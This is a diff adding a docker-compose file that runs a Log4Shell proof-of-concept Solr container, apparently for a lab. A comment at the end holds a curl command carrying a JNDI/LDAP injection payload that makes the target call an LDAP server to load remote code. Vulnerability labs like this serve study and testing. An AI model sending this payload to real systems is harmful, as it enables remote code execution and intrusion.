@@ -1,0 +1,9 @@
+version: '3'
+services:
+ solr:
+   image: gyaansastra/log4shell-poc3:latest
+   container_name: log4shell-poc3
+   ports:
+    - "8983:8983"
+
+#curl 'http://172.16.2.4:8983/solr/admin/cores?foo=$\{jndi:ldap://172.16.2.4:1389/a\}'
